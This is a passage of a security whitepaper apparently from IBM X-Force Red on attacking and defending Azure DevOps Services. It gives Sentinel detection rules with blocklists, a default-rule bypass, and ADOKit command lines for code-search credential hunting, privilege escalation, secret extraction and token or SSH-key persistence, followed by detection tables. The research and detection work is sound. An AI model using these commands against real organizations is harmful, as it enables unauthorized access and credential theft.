`// Change to true to monitor for Project Administrator adds to *any* project` **let MonitorAllProjects = false** `; // If MonitorAllProjects is false, trigger only on Project Administrator add for the following projects` **let ProjectsToMonitor = dynamic(['<project_X>','<project_Y>']);** `AzureDevOpsAuditing`

`| where Area == "Group" and OperationName ==` **"Group.UpdateGroupMembership.Add" | where Details has 'Administrators' | where Details has "was added as a member of group" and (Details endswith '\\Project Administrators' or Details endswith '\\Project Collection Administrators')**

```
| parse Details with AddedIdentity ' was added as a member of group ['
EntityName ']\\' GroupName
```

```
| extend Level = iif(GroupName == 'Project Collection Administrators',
'Organization', 'Project'), AddedIdentityId = Data.MemberId
| extend Severity = iif(Level == 'Organization', 'High', 'Medium'),
AlertDetails = strcat('At ', TimeGenerated, ' UTC ', ActorUPN, '/',
ActorDisplayName, ' added ', AddedIdentity, ' to the ', EntityName, ' ',
Level)
```

`|` **where MonitorAllProjects == true or EntityName in (ProjectsToMonitor) or Level == 'Organization'** `| project TimeGenerated, Severity, Adder = ActorUPN, AddedIdentity, AddedIdentityId, AlertDetails, Level, EntityName, GroupName, ActorAuthType = AuthenticationMechanism, ActorIpAddress = IpAddress, ActorUserAgent = UserAgent, RawDetails = Details | extend timestamp = TimeGenerated, AccountCustomEntity = Adder, IPCustomEntity = ActorIpAddress`

### _Bypass_

In its default state, this rule will not detect the addition of a Project Administrator to a project. The rule will need to be modified to either monitor all projects ( `MonitorAllProjects` variable), or specific projects need listed in the `ProjectsToMonitor` variable. Therefore, in its current state, you can add members to the Project Administrators group for a project without triggering this rule.

IBM X-Force Red | November 6, 2023

86

## Slide 87

## IMPROVING DETECTION OF ATTACKS AGAINST AZURE DEVOPS SERVICES

Several of the attack scenarios shown in this whitepaper do not have default rules tuned appropriately, or do not have auditable events that are available in the Azure DevOps Services audit log. An example of this is there are no audit events for performing code search events. This is a gap, as attackers will commonly search for credentials within code repositories, and this can be a great opportunity to catch attackers performing this reconnaissance early in the attack chain.

Some audit events that are available do not trigger for all use cases. For example, the `Pipelines.PipelineModified` event will only log if settings of a build pipeline change (e.g., adding a variable) and do not cover the modification of the actual pipeline configuration file ( `azure-pipelines.yml` ) if additional code was added. If this `Pipelines.PipelineModified` event was properly logged for all use cases, this could enable defenders to detect anomalies when an attacker is trying to modify a build pipeline to perform malicious actions. In the below sections you will find improvements to existing default Microsoft Sentinel analytic rules, along with new rules for Microsoft Sentinel that can be used to help detect the abuse of Azure DevOps Services as shown in this whitepaper.

### **Default Rule Improvement: Azure DevOps Personal Access Token (PAT) misuse**

The modifications highlighted in **blue** below will improve this rule using the REST API to perform sensitive operations through the authentication mechanism of not only PAT’s but also stolen authentication cookies. Additionally, this rule should be renamed to “Azure DevOps REST API misuse” since it is not only looking for PAT usage. It is recommended to test this rule out in your environment and perform tuning as needed to reduce false positives.

```
// Allowlisted UPNs should likely stay empty
let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com'];
// Operation Name parts that will alert
let HasAnyBlocklist =
datatable(OperationNamePart:string)['Security.','Project.','AuditLog.','Extens
ion.'];
// Distinct Operation Names that will flag
let HasExactBlocklist =
datatable(OperationName:string)['Group.UpdateGroupMembership.Add','Library.Ser
viceConnectionExecuted','Pipelines.PipelineModified',
'Release.ReleasePipelineModified', 'Git.RefUpdatePoliciesBypassed'];
AzureDevOpsAuditing
```

IBM X-Force Red | November 6, 2023

87

## Slide 88

`| where (AuthenticationMechanism startswith "PAT` **" or AuthenticationMechanism startswith "UserAuthToken")** `and (OperationName has_any (HasAnyBlocklist) or OperationName in (HasExactBlocklist)) and ActorUPN !in (AllowlistedUpns) | project TimeGenerated, AuthenticationMechanism, ProjectName, ActorUPN, ActorDisplayName, IpAddress, UserAgent, OperationName, Details, Data | extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN, IPCustomEntity = IpAddress`

### **Default Rule Improvement: New PA, PCA, or PCAS added to Azure DevOps**

The modifications highlighted in **blue** below will improve this rule for the detection of adding members to the Build Administrators or Project Collection Build Administrators groups. It is recommended to test this rule out in your environment and perform tuning as needed to reduce false positives.

`AzureDevOpsAuditing | where OperationName =~ "Group.UpdateGroupMembership.Add" | where Details has_any ("Project Administrators", "Project Collection Administrators", "Project Collection Service Accounts", "Build Administrator` **s", “Project Collection Build Administrators”)** `| project-reorder TimeGenerated, Details, ActorUPN, IpAddress, UserAgent, AuthenticationMechanism, ScopeDisplayName | extend timekey = bin(TimeGenerated, 1h) | extend ActorUserId = tostring(Data.MemberId) | project timekey, ActorUserId, AddingUser=ActorUPN, TimeAdded=TimeGenerated, PermissionGrantDetails = Details // Get details of operations conducted by user soon after elevation of permissions | join (AzureDevOpsAuditing | extend ActorUserId = tostring(Data.MemberId) | extend timekey = bin(TimeGenerated, 1h)) on timekey, ActorUserId | summarize ActionsWhenAdded = make_set(OperationName) by ActorUPN, AddingUser, TimeAdded, PermissionGrantDetails, IpAddress, UserAgent | extend timestamp = TimeAdded, AccountCustomEntity = ActorUPN, IPCustomEntity = IpAddress`

### **Default Rule Improvement: Azure DevOps Administrator Group Monitoring**

The modifications highlighted in **blue** below will improve this rule for the detection of members to the Project Administrators group for any project. It is recommended to test this rule out in your environment and perform tuning as needed to reduce false positives.

IBM X-Force Red | November 6, 2023

88

## Slide 89

`// Change to true to monitor for Project Administrator adds to *any* project let MonitorAllProjects =` **true** `; // If MonitorAllProjects is false, trigger only on Project Administrator add for the following projects let ProjectsToMonitor = dynamic(['<project_X>','<project_Y>']); AzureDevOpsAuditing | where Area == "Group" and OperationName == "Group.UpdateGroupMembership.Add" | where Details has 'Administrators' | where Details has "was added as a member of group" and (Details endswith '\\Project Administrators' or Details endswith '\\Project Collection Administrators') | parse Details with AddedIdentity ' was added as a member of group [' EntityName ']\\' GroupName | extend Level = iif(GroupName == 'Project Collection Administrators', 'Organization', 'Project'), AddedIdentityId = Data.MemberId | extend Severity = iif(Level == 'Organization', 'High', 'Medium'), AlertDetails = strcat('At ', TimeGenerated, ' UTC ', ActorUPN, '/', ActorDisplayName, ' added ', AddedIdentity, ' to the ', EntityName, ' ', Level) | where MonitorAllProjects == true or EntityName in (ProjectsToMonitor) or Level == 'Organization' | project TimeGenerated, Severity, Adder = ActorUPN, AddedIdentity, AddedIdentityId, AlertDetails, Level, EntityName, GroupName, ActorAuthType = AuthenticationMechanism, ActorIpAddress = IpAddress, ActorUserAgent = UserAgent, RawDetails = Details | extend timestamp = TimeGenerated, AccountCustomEntity = Adder, IPCustomEntity = ActorIpAddress`

### **New Rule: Azure DevOps Persistence Technique Detected**

The below rule logic can be applied to a new scheduled query analytic rule to detect the creation of PAT’s or SSH keys to be used as persistence, as shown in the techniques in this whitepaper. This rule will look for the creation of an SSH key or PAT. As a reminder, a PAT cannot be used to create another PAT or an SSH key via the REST API, therefore you will not see `Authentication Mechanism startswith “PAT”` in the rule. It is recommended to test this rule out in your environment and perform tuning as needed to reduce false positives.

```
// Allowlisted UPNs should likely stay empty
let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com'];
// Distinct Operation Names that will flag
let HasExactBlocklist =
datatable(OperationName:string)['Token.SshCreateEvent','Token.PatCreateEvent']
;
AzureDevOpsAuditing
```

IBM X-Force Red | November 6, 2023

89

## Slide 90

```
| where (AuthenticationMechanism startswith "S2S_ServicePrincipal" or
AuthenticationMechanism startswith "UserAuthToken") and (OperationName in
(HasExactBlocklist))
  and ActorUPN !in (AllowlistedUpns)
| project TimeGenerated, AuthenticationMechanism, ActorUPN, ActorDisplayName,
IpAddress, UserAgent, OperationName, Details, Data
| extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN,
IPCustomEntity = IpAddress
```

### _Personal Access Tokens_

After creating the rule, you can see it triggering below when creating a personal access token using the REST API and an authentication cookie.

_New analytics rule triggering for Azure DevOps persistence_

The event related to the alert is shown below.

IBM X-Force Red | November 6, 2023

90

## Slide 91

_Event details that triggered alert for creating PAT_

### _SSH Keys_

The alert was also triggered due to the creation of an SSH key to be used for persistence. This was conducted using an authentication cookie and the REST API. A screenshot of the correlating event is shown below.

_Event details that triggered alert for creating SSH key_

IBM X-Force Red | November 6, 2023

91

## Slide 92

# ADOKit

## BACKGROUND

At X-Force Red, we wanted to take advantage of the REST API functionality in Azure DevOps Services and add the most useful functionality in a tool called ADOKit. The goal of this tool is to provide awareness of the abuse of Azure DevOps Services, and to encourage the detection of attack techniques against Azure DevOps Services. This tool can enable both offensive and defensive security practitioners to simulate attacks against Azure DevOps Services to increase the security posture of their environment and configuration.

ADOKit allows the user to specify the attack module to use, along with specifying valid credentials (authentication cookie or PAT) and the URL to the appropriate Azure DevOps Services organization. The attack modules supported include reconnaissance, privilege escalation and persistence. ADOKit can be run on disk or in memory via a command and control (C2) framework. Other functionality available in the non-public version of ADOKit was not included in consideration for defenders. ADOKit was built in a modular approach, so that new modules can be added in the future by the information security community. The tool and full documentation are available on the X-Force Red GitHub<sup>53</sup> . Example use cases will be shown in the next sections.

## RECONNAISSANCE

Below are some of the useful reconnaissance modules available within ADOKit. There are several more reconnaissance modules available within the toolkit. Full documentation is on the ADOKit GitHub repository<sup>54</sup> .

### **Whoami**

After you have compromised a user authentication cookie or PAT, you will want to see what types of group memberships your compromised user has. By running the `whoami` module, this will give you the user you are authenticating as, along with any project or collection group membership the user has.

```
ADOKit.exe whoami /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization
```

> 53 https://github.com/xforcered

> 54 https://github.com/xforcered/ADOKit

IBM X-Force Red | November 6, 2023

92

## Slide 93

```
ADOKit.exe whoami /credential:patToken
/url:https://dev.azure.com/YourOrganization
```

_Module output for whoami_

### **Searching Code for Passwords**

One common area of reconnaissance is to search for any code containing credentials. You can perform this using the `searchcode` module.

```
ADOKit.exe searchcode /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /search:”search term”
```

```
ADOKit.exe searchcode /credential:patToken /url:https://dev.azure.com/
YourOrganization /search:”search term”
```

_Module output for searchcode_

### **Get Group Members**

Another area of reconnaissance that would be valuable to an attacker is getting all members of administrative groups for further targeting. This can be performed with the `getgroupmembers` module.

IBM X-Force Red | November 6, 2023

93

## Slide 94

```
ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /group:”search term”
```

```
ADOKit.exe getgroupmembers /credential:patToken /url:https://dev.azure.com/
YourOrganization /group:”search term”
```

_Module output for getgroupmembers_

### **Get Project Permissions**

If there is an interesting project that is being targeted, it is useful to know which users have authorization to that project, and what their access level is. This can be identified using the `getpermissions` module.

```
ADOKit.exe getpermissions /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /project:”project name”
```

```
ADOKit.exe getpermissions /credential:patToken /url:https://dev.azure.com/
YourOrganization /project:”project name”
```

IBM X-Force Red | November 6, 2023

94

## Slide 95

_Snippet of output from getpermissions module_

## PRIVILEGE ESCALATION

A few of the more impactful privilege escalation modules are shown in the examples below.

### **Add User to Privileged Group**

If you have compromised a user cookie or PAT and would like to add a non-privileged user that is within your control to an administrative project or collection group, this is possible with several modules available to add users to the privileged groups below.

- Privileged Collection Groups

   - Project Collection Administrators

   - Project Collection Build Administrators

   - Project Collection Build Service Accounts

   - Project Collection Service Accounts

- Privileged Project Groups

   - Build Administrators

   - Project Administrators

An example is shown below adding a user to the Project Collection Build Administrators group using the `addcollectionbuildadmin` module

```
ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /user:”username”
```

IBM X-Force Red | November 6, 2023

95

## Slide 96

```
ADOKit.exe addcollectionbuildadmin /credential:patToken
/url:https://dev.azure.com/YourOrganization /user:”username”
```

_Module output for addcollectionbuildadmin_

### **Get Pipeline Variables and Secrets**

The ability to obtain build pipeline variables and secret names can be useful for an attacker looking to perform privilege escalation and lateral movement throughout an organization. You can obtain build pipeline variables via the `getpipelinevars` module.

```
ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /project:”project name”
```

```
ADOKit.exe getpipelinevars /credential:patToken /url:https://dev.azure.com/
YourOrganization /project:”project name”
```

_Module output for getpipelinevars_

Additionally, if a project is using a secret variable, you can get the name of the secret variable using the `getpipelinesecrets` module. This helps for additional targeting to perform the steps shown in the Retrieve Azure DevOps Services Build Variables and <u>Secrets</u> section to extract the contents of the secret variables.

```
ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /project:”project name”
```

IBM X-Force Red | November 6, 2023

96

## Slide 97

```
ADOKit.exe getpipelinesecrets /credential:patToken /url:https://dev.azure.com/
YourOrganization /project:”project name”
```

_Module output for getpipelinesecrets_

### **Get Service Connections**

Service Connections are another component of Azure DevOps Services where credential extraction can be performed. To identify projects that have service connections, along with their service connection information, you can run the `getserviceconnections` module. Then you can perform the steps shown in the <u>Retrieve Service Connection Credentials section to extract the service connection</u> credentials.

```
ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /project:”project name”
```

```
ADOKit.exe getserviceconnections /credential:patToken
/url:https://dev.azure.com/YourOrganization /project:”project name”
```

_Module output for getserviceconnections_

## PERSISTENCE

Both available persistence modules are shown in the examples below for the creation of PAT’s and SSH keys.

IBM X-Force Red | November 6, 2023

97

## Slide 98

### **Personal Access Tokens**

You can create a PAT to be used for persistence using the `createpat` module. Authentication via a cookie is required for this module because PATs cannot be used to create other PATs.

```
ADOKit.exe createpat /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization
```

_Snippet of output for createpat module_

### **SSH Keys**

You can create an SSH key to be used for persistence using the `createsshkey` module. Authentication via a cookie is required for this module because PATs cannot be used to create SSH keys.

```
ADOKit.exe createsshkey /credential:UserAuthentication=ABC123
/url:https://dev.azure.com/YourOrganization /sshkey:”ssh pub key”
```

_Snippet of output for createsshkey module_

IBM X-Force Red | November 6, 2023

98

## Slide 99

# Defensive Considerations

## ADOKIT

There are multiple static signatures that can be used to detect the usage of ADOKit. These can be found in the YARA<sup>55</sup> rule on the ADOKit repository.

A static user agent string is used when attempting each module in ADOKit. The user agent string is `ADOKit-21e233d4334f9703d1a3a42b6e2efd38` . A snort<sup>56</sup> rule is provided in the ADOKit repository. Microsoft Sentinel analytic rule logic is provided below that can be applied in a Microsoft Sentinel scheduled query analytic rule to detect the usage of this tool for any auditable events.

```
AzureDevOpsAuditing
```

```
// Look for the user agent for ADOKit
```

```
| where UserAgent has_any ("ADOKit-21e233d4334f9703d1a3a42b6e2efd38")
| extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN,
IPCustomEntity = IpAddress
```

In this example, we used ADOKit to add a user to the Project Collection Administrators group, which caused our alert to trigger.

_Alert triggering for ADOKit usage_

> 55 https://yara.readthedocs.io/en/stable/writingrules.html

> 56 https://snort.org/

IBM X-Force Red | November 6, 2023

99

## Slide 100

### The event details for the correlating alert are shown below.

_Event details for ADOKit usage alert_

Additionally, any PAT’s or SSH keys that are created using ADOKit will be prepended with `ADOKit-` in the name. This can be filtered within Azure DevOps Services to indicate a PAT or SSH key was created using ADOKit. Microsoft Sentinel analytic rule logic is provided below that can be applied in a Microsoft Sentinel scheduled query analytic rule to detect the usage of ADOKit to add persistence via a created PAT or SSH key.

```
// Allowlisted UPNs should likely stay empty
let AllowlistedUpns = datatable(UPN:string)['foo@bar.com', 'test@foo.com'];
// Distinct Operation Names that will flag
let HasExactBlocklist =
datatable(OperationName:string)['Token.SshCreateEvent','Token.PatCreateEvent']
;
AzureDevOpsAuditing
| where (AuthenticationMechanism startswith "S2S_ServicePrincipal" or
AuthenticationMechanism startswith "UserAuthToken") and UserAgent has_any
("ADOKit-21e233d4334f9703d1a3a42b6e2efd38") and (OperationName in
(HasExactBlocklist))
  and ActorUPN !in (AllowlistedUpns)
| project TimeGenerated, AuthenticationMechanism, ActorUPN, ActorDisplayName,
IpAddress, UserAgent, OperationName, Details, Data
| extend timestamp = TimeGenerated, AccountCustomEntity = ActorUPN,
IPCustomEntity = IpAddress
```

In this example, we used ADOKit to create a PAT, which caused our alert to trigger.

IBM X-Force Red | November 6, 2023

100

## Slide 101

_Alert for persistence technique with ADOKit_

The event details for the correlating alert are shown below.

_Event details for persistence technique with ADOKit_

## AZURE DEVOPS SERVICES PLATFORM

Microsoft supplies an excellent guide on security best practices for securing your Azure DevOps Services instance here<sup>57</sup> . This includes security best practices for group permissions, authentication methods, pipelines, and much more.

> 57 For security best practices for Azure DevOps Services, see https://learn.microsoft.com/enus/azure/devops/organizations/security/security-best-practices?view=azure-devops

IBM X-Force Red | November 6, 2023

101

## Slide 102

In addition to applying security best practices for the platform, if you are sending your Azure DevOps Services logs to Microsoft Sentinel, consider making the modifications to the default analytic rules and adding new rules highlighted in the Improving Detection <u>of Attacks Against Azure DevOps Services section of this whitepaper. This will enhance</u> your capability to detect the attacks shown in this whitepaper.

Finally, another security control to increase the security posture of your Azure DevOps Services instance is Microsoft Defender for DevOps<sup>58</sup> . This allows an organization to proactively detect when credentials are being insecurely stored or used within code and can also scan code for known vulnerabilities.

> 58 https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-devops-introduction

IBM X-Force Red | November 6, 2023

102

## Slide 103

# Conclusion

The adoption of cloud-based services continues to be part of the long-term strategy for organizations. Possessing the ability to log and detect attacker activity in cloud-based services has become more important than ever, as attackers continue to abuse these platforms, such as the Storm-0558 threat actor group. Furthermore, organizations rely on DevOps systems to deploy business critical internal applications, or applications to customers that depend on these systems. As such, properly securing cloud-based DevOps services, such as Azure DevOps Services, continues to be critical, especially with attackers performing software supply chain attacks and source code theft attacks. It is X-Force Red’s goal that this whitepaper and research will bring more attention and inspire future research on defending other business critical cloud-based DevOps services.

IBM X-Force Red | November 6, 2023

103

## Slide 104

# Acknowledgments

A special thank you to the below people for giving feedback on this research and providing whitepaper content review.

- Chris Thompson (@retBandit)

- John Dwyer (@TactiKoolSec)

- Matthew DeFir (@chefm4tt)

- Patrick Fussell (@capt_red_beardz)

- Sanjiv Kawa(@sanjivkawa)

IBM X-Force Red | November 6, 2023

104

## Slide 105

# Appendix A: Attack Scenarios Detection Table

The below table lists the attack scenarios shown in this whitepaper, and whether they are currently detected (as of this whitepaper publish date) by the default Microsoft Sentinel Azure DevOps Services rules.

|Attack Scenario|Det|ected by default
rule(s)?|Rule Name(s)|
|---|---|---|---|
|Projects Reconnaissance|No||N/A|
|Repositories
Reconnaissance|No||N/A|
|Files Reconnaissance|No||N/A|
|Code Reconnaissance|No||N/A|
|User/Group
Reconnaissance|No||N/A|
|Persistence|No||N/A|
|Adding User to Project
Administrators|Yes||New PA, PCA, or PCAS
added to Azure DevOps|
|Adding User to Build
Administrators|No||N/A|
|Adding User to Project|Yes||New PA, PCA, or PCAS|
|Collection Administrators|||added to Azure DevOps|

IBM X-Force Red | November 6, 2023

105

## Slide 106

|Adding User to Project
Collection Service
Accounts|Yes|New PA, PCA, or PCAS
added to Azure DevOps|
|---|---|---|
|Adding User to Project
Collection Build
Administrators|No|N/A|
|Modifying Azure DevOps
Services Build Pipeline|No|N/A|
|Compromise On-Premise
Host via Self-Hosted
Agent|No|N/A|
|Retrieve Azure DevOps
Services Build Variables
and Secrets|No|N/A|
|Retrieve Azure Key Vault
Secrets|No|N/A|
|Retrieve Service
Connection Credentials|No|N/A|
|Creating Azure DevOps
Services Agent Pool|Yes|Azure DevOps Agent Pool
Created Then Deleted|
|Disabling Azure DevOps
Services Audit Stream|Yes|Azure DevOps Audit
Stream Disabled|
|Reducing Azure DevOps
Services Log Retention|Yes|Azure DevOps Retention
Reduced|
|Adding External Upstream
Source to Azure DevOps
Services Feed|Yes|External Upstream Source
Added to Azure DevOps
Feed|

IBM X-Force Red | November 6, 2023

106

## Slide 107

|REST API Abuse -
Reconnaissance|No|N/A|
|---|---|---|
|REST API Abuse -
Persistence|No|N/A|
|REST API Abuse - Adding
User to Group|Yes|Azure DevOps Personal
Access Token (PAT)
misuse|
|REST API Abuse - Retrieve
Build Variables and
Secrets|No|N/A|
|REST API Abuse - Retrieve
Service Connection
Information|No|N/A|

_Attack scenarios and associated detection result_

IBM X-Force Red | November 6, 2023

107

## Slide 108

# Appendix B: Permissions Required for Attack Scenarios

The below table shows the project or collection group permissions required to perform the associated attack scenario shown in this whitepaper. Only one of the group permissions is needed to perform the correlating attack scenarios.

|Attack Scenario|Project Security Groups|Collection Security Groups|
|---|---|---|
|Projects Reconnaissance|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Test
Service Accounts
Project Collection Proxy
Service Accounts
Project Collection Build
Service Accounts
Project Collection
Administrators|
|Repositories
Reconnaissance|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Proxy
Service Accounts
Project Collection Build
Service Accounts
Project Collection
Administrators|
|Files Reconnaissance|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Proxy
Service Accounts
Project Collection Build
Service Accounts
Project Collection
Administrators|

IBM X-Force Red | November 6, 2023

108

## Slide 109

|Code Reconnaissance|Contributors
Readers
Project Administrators
Project Team Member
Build Administrators|Project Collection Proxy
Service Accounts
Project Collection Build
Service Accounts
Project Collection
Administrators|
|---|---|---|
|User/Group
Reconnaissance|N/A|Any|
|Persistence|Any|Any|
|Adding User to Project
Administrators|Project Administrators|Project Collection Service
Accounts
Project Collection
Administrators|
|Adding User to Build
Administrators|Project Administrators|Project Collection Service
Accounts
Project Collection
Administrators|
|Adding User to Project
Collection Administrators|N/A|Project Collection Service
Accounts
Project Collection
Administrators|
|Adding User to Project
Collection Service
Accounts|N/A|Project Collection Service
Accounts
Project Collection
Administrators|

IBM X-Force Red | November 6, 2023

109

## Slide 110

|Adding User to Project
Collection Build
Administrators|N/A|Project Collection Service
Accounts
Project Collection
Administrators|
|---|---|---|
|Modifying Azure DevOps
Services Build Pipeline|Contributors
Build Administrators
Project Administrators
Project Team Member|Project Collection Build
Administrators
Project Collection Service
Accounts
Project Collection
Administrators|
|Compromise On-Premise
Host via Self-Hosted
Agent|Contributors
Build Administrators
Project Administrators
Project Team Member|Project Collection Build
Administrators
Project Collection Service
Accounts
Project Collection
Administrators|
|Retrieve Azure DevOps
Services Build Variables
and Secrets|Contributors
Readers
Build Administrators
Project Administrators
Project Team Member|Project Collection Test
Service Accounts
Project Collection Build
Service Accounts
Project Collection Build
Administrators
Project Collection Service
Accounts
Project Collection
Administrators|
|Retrieve Azure Key Vault
Secrets|Contributors|Project Collection Build
Administrators|

IBM X-Force Red | November 6, 2023

110

## Slide 111

||Build Administrators
Project Administrators
Project Team Member|Project Collection Service
Accounts
Project Collection
Administrators|
|---|---|---|
|Retrieve Service
Connection Credentials|Project Administrators|Project Collection Service
Accounts
Project Collection
Administrators|
|Creating Azure DevOps
Services Agent Pool|N/A|Project Collection Service
Accounts
Project Collection
Administrators|
|Disabling Azure DevOps
Services Audit Stream|N/A|Project Collection Service
Accounts
Project Collection
Administrators|
|Reducing Azure DevOps
Services Log Retention|Project Administrators|Project Collection Service
Accounts
Project Collection
Administrators|
|Adding External Upstream
Source to Azure DevOps
Services Feed|Feed Owner|Project Collection Service
Accounts
Project Collection
Administrators|
|REST API Abuse -
Reconnaissance|Contributors
Readers
Project Administrators|Project Collection Test
Service Accounts
Project Collection Proxy
Service Accounts|

IBM X-Force Red | November 6, 2023

111

## Slide 112

||Project Team Member
Build Administrators|Project Collection Build
Service Accounts
Project Collection
Administrators|
|---|---|---|
|REST API Abuse -
Persistence|Any|Any|
|REST API Abuse - Adding
User to Group|Project Administrators|Project Collection Service
Accounts
Project Collection
Administrators|
|REST API Abuse - Retrieve
Build Variables and
Secrets|Contributors
Readers
Build Administrators
Project Administrators
Project Team Member|Project Collection Test
Service Accounts
Project Collection Build
Service Accounts
Project Collection Build
Administrators
Project Collection Service
Accounts
Project Collection
Administrators|
|REST API Abuse - Retrieve
Service Connection
Information|Project Administrators|Project Collection Service
Accounts
Project Collection
Administrators|

_Permissions required for attack scenarios_

IBM X-Force Red | November 6, 2023

112
